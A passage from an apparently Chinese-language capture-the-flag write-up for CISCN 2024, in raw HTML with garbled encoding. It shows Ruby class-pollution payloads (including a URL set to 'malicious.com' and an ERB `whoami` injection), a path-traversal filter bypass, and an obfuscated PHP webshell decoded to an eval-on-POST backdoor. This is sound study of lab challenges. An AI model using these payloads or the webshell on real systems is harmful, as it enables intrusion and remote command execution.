class="token keyword">else</span>        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>          current_obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value        <span class="token keyword">else</span>          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key        <span class="token keyword">end</span>      <span class="token keyword">end</span>    <span class="token keyword">end</span>    original  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> Person  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span> age<span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span> details<span class="token punctuation">)</span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">class</span> <span class="token class-name">KeySigner</span>  <span class="token variable">@@signing_key</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"default-signing-key"</span></span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">signing_key</span></span>    <span class="token variable">@@signing_key</span>  <span class="token keyword">end</span>  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">sign</span></span><span class="token punctuation">(</span>signing_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">data</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">-signed-with-</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">signing_key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>  <span class="token keyword">end</span><span class="token keyword">end</span><span class="token keyword">class</span> <span class="token class-name">JSONMergerApp</span> <span class="token operator">&lt;</span> Sinatra<span class="token double-colon punctuation">::</span>Base  set  <span class="token symbol">:bind</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'0.0.0.0'</span></span>  set  <span class="token symbol">:port</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'8888'</span></span>  post <span class="token string-literal"><span class="token string">'/merge'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>    j_str <span class="token operator">=</span> request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>read    <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"try try try"</span></span>  <span class="token keyword">if</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"\\"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"h"</span></span><span class="token punctuation">)</span>    json_input <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span>parse<span class="token punctuation">(</span>j_str<span class="token punctuation">,</span> <span class="token symbol">symbolize_names</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>      <span class="token symbol">name</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"John Doe"</span></span><span class="token punctuation">,</span>      <span class="token symbol">age</span><span class="token operator">:</span> <span class="token number">30</span><span class="token punctuation">,</span>      <span class="token symbol">details</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-literal"><span class="token string">"occupation"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Engineer"</span></span><span class="token punctuation">,</span>        <span class="token string-literal"><span class="token string">"location"</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>          <span class="token string-literal"><span class="token string">"city"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Madrid"</span></span><span class="token punctuation">,</span>          <span class="token string-literal"><span class="token string">"country"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Spain"</span></span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span>    user<span class="token punctuation">.</span>merge_with<span class="token punctuation">(</span>json_input<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'merged'</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json  <span class="token keyword">end</span>  <span class="token comment"># GET /launch-curl-command - Activates the first gadget</span>  get <span class="token string-literal"><span class="token string">'/launch-curl-command'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>    <span class="token comment"># This gadget makes an HTTP request to the URL stored in the User class</span>    <span class="token keyword">if</span> Person<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:url</span><span class="token punctuation">)</span>      url <span class="token operator">=</span> Person<span class="token punctuation">.</span>url      response <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HTTP request made'</span></span><span class="token punctuation">,</span> <span class="token symbol">url</span><span class="token operator">:</span> url <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json    <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'Failed to access URL variable'</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json    <span class="token keyword">end</span>  <span class="token keyword">end</span>    get <span class="token string-literal"><span class="token string">'/sign_with_subclass_key'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>        signer <span class="token operator">=</span> <span class="token class-name">KeySigner</span><span class="token punctuation">.</span><span class="token keyword">new</span>    signed_data <span class="token operator">=</span> signer<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>KeySigner<span class="token punctuation">.</span>signing_key<span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"data-to-sign"</span></span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'Data signed'</span></span><span class="token punctuation">,</span> <span class="token symbol">signing_key</span><span class="token operator">:</span> KeySigner<span class="token punctuation">.</span>signing_key<span class="token punctuation">,</span> <span class="token symbol">signed_data</span><span class="token operator">:</span> signed_data <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json  <span class="token keyword">end</span>    get <span class="token string-literal"><span class="token string">'/check-infected-vars'</span></span> <span class="token keyword">do</span>    content_type <span class="token symbol">:json</span>    <span class="token punctuation">&#123;</span>      <span class="token symbol">user_url</span><span class="token operator">:</span> Person<span class="token punctuation">.</span>url<span class="token punctuation">,</span>      <span class="token symbol">signing_key</span><span class="token operator">:</span> KeySigner<span class="token punctuation">.</span>signing_key    <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json  <span class="token keyword">end</span>  get<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/'</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span>    erb <span class="token symbol">:hello</span>  <span class="token keyword">end</span>  run<span class="token operator">!</span> <span class="token keyword">if</span> app_file <span class="token operator">==</span> $<span class="token number">0</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/HackTricks-wiki/hacktricks/blob/3e784b40f5711208c50e75daa3a5b1a839cb7316/pentesting-web/deserialization/ruby-class-pollution.md">https://github.com/HackTricks-wiki/hacktricks/blob/3e784b40f5711208c50e75daa3a5b1a839cb7316/pentesting-web/deserialization/ruby-class-pollution.md</a></p><p><a href="https://book.hacktricks.xyz/cn/pentesting-web/deserialization/ruby-class-pollution">https://book.hacktricks.xyz/cn/pentesting-web/deserialization/ruby-class-pollution</a></p><p><a href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</a></p><p>payloadï¼šåè€…æ˜¯éšæœºæ‰¾ç±»è¦†ç›–çš„éœ€è¦å¤šæ¬¡å°è¯•</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"Http://malicious.com"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"signing_key"</span><span class="token operator">:</span><span class="token string">"injected-signing-key"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¼€å¤´è¿™ä¸ª<code># frozen_string_literal: true</code>ä¼šå†»ç»“æ‰€æœ‰å­—ç¬¦ä¸²å­—é¢é‡</p><p>è§‚å¯Ÿä¸€ä¸‹æ”¹åŠ¨çš„åœ°æ–¹</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">set  <span class="token symbol">:bind</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'0.0.0.0'</span></span>set  <span class="token symbol">:port</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'8888'</span></span>  <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"try try try"</span></span>  <span class="token keyword">if</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"\\"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"h"</span></span><span class="token punctuation">)</span>  <span class="token keyword">if</span> Person<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:url</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> Person<span class="token punctuation">.</span>url    response <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HTTP request made'</span></span><span class="token punctuation">,</span> <span class="token symbol">url</span><span class="token operator">:</span> url <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆå°±æ˜¯banäº†åæ–œæ å’Œ<code>h</code>ï¼ŒåŒæ—¶ curl æ— å›æ˜¾</p><p>å¯ä»¥ç”¨<code>H</code>ç»•è¿‡</p><p>ç„¶åæ¥ä¸‹æ¥çš„æ€è·¯æ˜¯åœ¨ JSONMergerApp é‡Œæ‰¾ä¸€ä¸ªèƒ½æ±¡æŸ“çš„å±æ€§æ¥å®ç°ç±»ä¼¼äºé™æ€æ–‡ä»¶è¯»å–æˆ–è€… getshell</p><p>è¿™é‡Œå°è¯•æ±¡æŸ“helloæ¨¡æ¿</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"templates"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"hello"</span><span class="token operator">:</span> <span class="token string">"&lt;%= `whoami` %>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æƒ³èµ·æ¥æœ‰wafï¼Œç»•ä¸è¿‡å»</p><p>æˆ–è€…è®¾ç½®é™æ€ç›®å½•</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"public_folder"</span><span class="token operator">:</span> <span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="hellowebï¼ˆå¤ç°ï¼‰"><a href="#hellowebï¼ˆå¤ç°ï¼‰" class="headerlink" title="hellowebï¼ˆå¤ç°ï¼‰"></a>hellowebï¼ˆå¤ç°ï¼‰</h1><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.php?file=hello.php</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Sun, 15 Dec 2024 02:10:51 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Vary</span><span class="token punctuation">:</span> <span class="token header-value">Accept-Encoding</span></span><span class="token header"><span class="token header-name keyword">tip</span><span class="token punctuation">:</span> <span class="token header-value">&amp;#105;&amp;#110;&amp;#99;&amp;#108;&amp;#117;&amp;#100;&amp;#101;&amp;#46;&amp;#112;&amp;#104;&amp;#112</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">2470</span></span>&lt;!-- ../hackme.php -->&lt;!--  ../tips.php  -->&lt;div class="relocating">Navigating to: &lt;span class="relocate-location">&lt;/span>...&lt;/div><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tipè§£ç å‡ºæ¥æ˜¯ include.phpï¼Œä½†æ˜¯è®¿é—®ä¸åˆ°è¿™ä¸ªæ–‡ä»¶</p><p>index.phpï¼Œhello.phpï¼Œhackme.phpï¼Œtips.php å‡åœ¨åŒä¸€æ–‡ä»¶å¤¹ä¸‹ï¼Œä½†æ˜¯ä¸Šé¢çš„ hint é‡Œæ˜¯<code>../</code>ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„ ..&#x2F;hackme.php å®é™…ä¸Šè®¿é—®çš„ä¹Ÿæ˜¯ hackme.php</p><p>ç»“åˆ Navigating ï¼ŒçŒœæµ‹æ›¿æ¢äº†<code>../</code>ä¸ºç©ºï¼Œæœ‰åŒå†™ç»•è¿‡ï¼Œå°è¯•<code>..././hackme.php</code></p><p>èƒ½è¯»åˆ°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$lJbGIY</span><span class="token operator">=</span><span class="token string double-quoted-string">"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME"</span><span class="token punctuation">;</span><span class="token variable">$OlWYMv</span><span class="token operator">=</span><span class="token string double-quoted-string">"zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel"</span><span class="token punctuation">;</span><span class="token variable">$lapUCm</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$YwzIst</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">33</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$OxirhK</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">33</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$YpAUWC</span><span class="token operator">=</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">18</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$rVkKjU</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">13</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$YwzIst</span><span class="token operator">.=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">22</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">36</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">29</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">26</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">32</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">35</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">26</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$YwzIst</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$YwzIst æ˜¯ base64_decodeï¼Œdecodeåçš„å†…å®¹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uWcdaA</span><span class="token operator">=</span><span class="token string double-quoted-string">"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox=="</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span><span class="token operator">.</span><span class="token variable">$YwzIst</span><span class="token punctuation">(</span><span class="token variable">$OxirhK</span><span class="token punctuation">(</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¤åˆ¶åˆ°æœ¬åœ°ä¸€æ­¥æ­¥ echo åˆ†æå‡ºæ¥</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215170723989.png" alt="image-20241215170723989"></p><p>é‚£ä¹ˆshellå°±æ˜¯ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd_66.99'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>èšå‰‘è¿ä¸Šå»ï¼Œæ³¨æ„å¯†ç å‚æ•°è¿™é‡Œæ˜¯<code>cmd[66.99</code></p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">&lt;!-- ../hackme.php --></span><span class="token comment">&lt;!--  ../tips.php  --></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: ./index.php?file=hello.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php:\/\/|http|data|ftp|input|%00/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">14</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1>NAIVE!!!&lt;/h1>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token 